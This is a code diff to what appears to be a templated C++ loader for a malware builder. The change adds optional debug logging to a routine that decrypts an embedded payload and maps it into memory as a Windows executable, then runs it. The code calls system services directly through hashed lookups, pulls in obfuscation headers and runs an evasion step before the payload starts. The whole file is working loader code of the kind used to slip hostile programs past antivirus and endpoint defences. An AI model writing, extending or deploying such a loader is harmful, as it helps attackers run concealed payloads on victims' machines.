@@ -3,6 +3,14 @@
 #include <windows.h>
 #include <winternl.h>
 
+{{#IF LOADER_DEBUG}}
+#include <stdio.h>
+#define DBG(fmt, ...) fprintf(stderr, "[DBG] " fmt "\n", ##__VA_ARGS__)
+{{#ENDIF}}
+#ifndef DBG
+#define DBG(fmt, ...)
+#endif
+
 #include "obfuscate.hpp.in"
 #include "api_hashing.hpp.in"
 #include "syscalls.hpp.in"
@@ -27,18 +35,21 @@ struct BASE_RELOCATION_ENTRY {
 };
 
 static void run_pe(uint8_t* pe_data, size_t pe_size) {
+    DBG("run_pe: %zu bytes", pe_size);
     auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(pe_data);
-    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;
+    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { DBG("invalid DOS signature"); return; }
 
     auto nt = reinterpret_cast<PIMAGE_NT_HEADERS>(pe_data + dos->e_lfanew);
-    if (nt->Signature != IMAGE_NT_SIGNATURE) return;
+    if (nt->Signature != IMAGE_NT_SIGNATURE) { DBG("invalid NT signature"); return; }
 
     SIZE_T image_size = nt->OptionalHeader.SizeOfImage;
     PVOID image_base = reinterpret_cast<PVOID>(nt->OptionalHeader.ImageBase);
+    DBG("PE: ImageBase=%p SizeOfImage=0x%zx Sections=%d",
+        image_base, image_size, nt->FileHeader.NumberOfSections);
 
     // Try to allocate at preferred base
     auto NtAVM = get_syscall_fn<NtAllocateVirtualMemory_t>(HASH_NtAllocateVirtualMemory);
-    if (!NtAVM) return;
+    if (!NtAVM) { DBG("NtAVM resolve FAILED"); return; }
 
     HANDLE hProc = GetCurrentProcess();
     NTSTATUS status = NtAVM(hProc, &image_base, 0, &image_size,
@@ -46,14 +57,15 @@ static void run_pe(uint8_t* pe_data, size_t pe_size) {
 
     ULONGLONG delta = 0;
     if (status != 0) {
-        // Failed at preferred base, allocate anywhere
+        DBG("preferred base unavailable, relocating");
         image_base = nullptr;
         image_size = nt->OptionalHeader.SizeOfImage;
         status = NtAVM(hProc, &image_base, 0, &image_size,
                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (status != 0) return;
+        if (status != 0) { DBG("NtAVM FAILED: 0x%08lx", status); return; }
         delta = reinterpret_cast<ULONGLONG>(image_base) - nt->OptionalHeader.ImageBase;
     }
+    DBG("mapped at %p (delta=0x%llx)", image_base, delta);
 
     // Copy headers
     memcpy(image_base, pe_data, nt->OptionalHeader.SizeOfHeaders);
@@ -100,6 +112,8 @@ static void run_pe(uint8_t* pe_data, size_t pe_size) {
             }
         }
     }
+
+    DBG("sections copied, relocations processed");
 
     // Resolve imports
     auto& import_dir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
@@ -166,8 +180,11 @@ static void run_pe(uint8_t* pe_data, size_t pe_size) {
         reinterpret_cast<BYTE*>(image_base) + dos->e_lfanew);
     new_nt->OptionalHeader.ImageBase = reinterpret_cast<ULONG_PTR>(image_base);
 
+    DBG("imports resolved, permissions set");
+
     // Call entry point
     auto entry = reinterpret_cast<BYTE*>(image_base) + nt->OptionalHeader.AddressOfEntryPoint;
+    DBG("calling entry point at %p", entry);
 
     if (nt->FileHeader.Characteristics & IMAGE_FILE_DLL) {
         using DllMain_t = BOOL(WINAPI*)(HINSTANCE, DWORD, LPVOID);
@@ -177,6 +194,7 @@ static void run_pe(uint8_t* pe_data, size_t pe_size) {
         auto pMain = reinterpret_cast<int(*)()>(entry);
         pMain();
     }
+    DBG("PE entry point returned");
 }
 
 {{#IF DLL_ENTRY}}
@@ -214,8 +232,11 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
 
 {{#IF EXE_ENTRY}}
 int main() {
-    if (!init_syscalls()) return 1;
-    if (!evasion_init()) return 1;
+    DBG("loader started (PE)");
+    if (!init_syscalls()) { DBG("init_syscalls FAILED"); return 1; }
+    DBG("syscalls initialized");
+    if (!evasion_init()) { DBG("evasion_init FAILED"); return 1; }
+    DBG("evasion initialized");
 
     uint8_t* encrypted = payload;
     size_t encrypted_len = payload_len;
